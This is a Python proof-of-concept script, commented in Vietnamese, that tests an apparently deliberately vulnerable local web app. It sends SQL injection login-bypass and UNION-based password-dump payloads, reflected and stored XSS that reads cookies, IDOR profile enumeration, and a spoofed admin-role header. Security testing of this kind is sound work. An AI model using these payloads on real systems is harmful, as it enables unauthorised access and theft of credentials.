import urllib.request
import urllib.parse
import http.cookiejar

base_url = "http://localhost:3000"

print("=================================================================")
print("  BẮT ĐẦU QUY TRÌNH KIỂM THỬ AN TOÀN THÔNG TIN TỰ ĐỘNG (PoC)")
print("=================================================================\n")

# 1. Test SQL Injection Bypass Login
print("[1] KIỂM THỬ SQL INJECTION (Authentication Bypass)")
login_url = f"{base_url}/login"
payload = {"username": "admin' --", "password": "anypassword"}
data = urllib.parse.urlencode(payload).encode('utf-8')
req = urllib.request.Request(login_url, data=data, method="POST")

try:
    with urllib.request.urlopen(req) as resp:
        cookies = resp.headers.get_all('Set-Cookie')
        print(f" -> Trạng thái HTTP: {resp.status}")
        print(f" -> URL chuyển hướng/kết quả: {resp.url}")
        print(f" -> Cookie nhận được: {cookies}")
        if 'auth_token=session_admin_token_xyz' in str(cookies):
            print(" [VULNERABLE] SQLi Bypass thành công! Đăng nhập thẳng với quyền admin bằng payload 'admin\\' --'.")
        else:
            print(" [-] Không bypass được.")
except Exception as e:
    print(f" [!] Lỗi: {e}")

# 2. Test SQL Injection UNION Based trên Products
print("\n[2] KIỂM THỬ SQL INJECTION UNION-BASED (Trang Tìm kiếm sản phẩm)")
sqli_search = f"{base_url}/products?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20role%20FROM%20users%20--"
req = urllib.request.Request(sqli_search)
try:
    with urllib.request.urlopen(req) as resp:
        content = resp.read().decode('utf-8')
        if "admin123" in content and "password123" in content:
            print(" [VULNERABLE] UNION-Based SQL Injection thành công! Toàn bộ bảng `users` (gồm plaintext password) đã bị trích xuất.")
        else:
            print(" [-] Không tìm thấy dữ liệu rò rỉ.")
except Exception as e:
    print(f" [!] Lỗi: {e}")

# 3. Test Reflected XSS
print("\n[3] KIỂM THỬ REFLECTED CROSS-SITE SCRIPTING (Reflected XSS)")
xss_payload = "<script>alert('Reflected-XSS')</script>"
xss_url = f"{base_url}/products?q={urllib.parse.quote(xss_payload)}"
req = urllib.request.Request(xss_url)
try:
    with urllib.request.urlopen(req) as resp:
        content = resp.read().decode('utf-8')
        if xss_payload in content:
            print(f" [VULNERABLE] Reflected XSS thành công! Chuỗi payload `{xss_payload}` được render nguyên gốc trong HTML mà không qua htmlspecialchars/encode.")
        else:
            print(" [-] Payload bị lọc hoặc encode.")
except Exception as e:
    print(f" [!] Lỗi: {e}")

# 4. Test Stored XSS
print("\n[4] KIỂM THỬ STORED CROSS-SITE SCRIPTING (Stored XSS - Feedback)")
stored_payload = "<script>alert(document.cookie)</script>"
feedback_data = urllib.parse.urlencode({"author": "Attacker", "content": stored_payload}).encode('utf-8')
req = urllib.request.Request(f"{base_url}/feedback", data=feedback_data, method="POST")
urllib.request.urlopen(req)

# Kiểm tra lại trang feedback xem payload có được lưu và hiển thị
with urllib.request.urlopen(f"{base_url}/feedback") as resp:
    content = resp.read().decode('utf-8')
    if stored_payload in content:
        print(f" [VULNERABLE] Stored XSS thành công! Mã độc script `{stored_payload}` đã được lưu vĩnh viễn trong CSDL và kích hoạt khi bất kỳ ai xem trang.")
    else:
        print(" [-] Không lưu trữ mã độc.")

# 5. Test IDOR (Insecure Direct Object Reference)
print("\n[5] KIỂM THỬ INSECURE DIRECT OBJECT REFERENCE (IDOR / BOLA)")
for user_id in [1, 2, 3]:
    req = urllib.request.Request(f"{base_url}/profile?id={user_id}")
    with urllib.request.urlopen(req) as resp:
        content = resp.read().decode('utf-8')
        if "User ID:" in content:
            print(f" [VULNERABLE] IDOR thành công! Không cần đăng nhập vẫn truy cập được thông tin nhạy cảm của User ID = {user_id}")

# 6. Test Broken Access Control (Admin Privilege Escalation)
print("\n[6] KIỂM THỬ BROKEN ACCESS CONTROL (Admin Panel Bypass)")
# Thử truy cập thường
try:
    req = urllib.request.Request(f"{base_url}/admin")
    urllib.request.urlopen(req)
except urllib.error.HTTPError as e:
    print(f" -> Truy cập thông thường: Mã HTTP {e.code} (Từ chối đúng dự kiến)")

# Thử thêm header giả mạo
req_spoof = urllib.request.Request(f"{base_url}/admin", headers={"X-Role-Override": "admin"})
try:
    with urllib.request.urlopen(req_spoof) as resp:
        content = resp.read().decode('utf-8')
        if "Bảng quản lý tài khoản và mật khẩu" in content:
            print(" [VULNERABLE] Broken Access Control thành công! Giả mạo Header `X-Role-Override: admin` cho phép kẻ tấn công leo thang đặc quyền xem toàn bộ dữ liệu quản trị.")
except Exception as e:
    print(f" [!] Lỗi: {e}")

print("\n=================================================================")
print("  HOÀN THÀNH QUÁ TRÌNH KIỂM THỬ VÀ THU THẬP BẰNG CHỨNG (PoC)")
print("=================================================================")
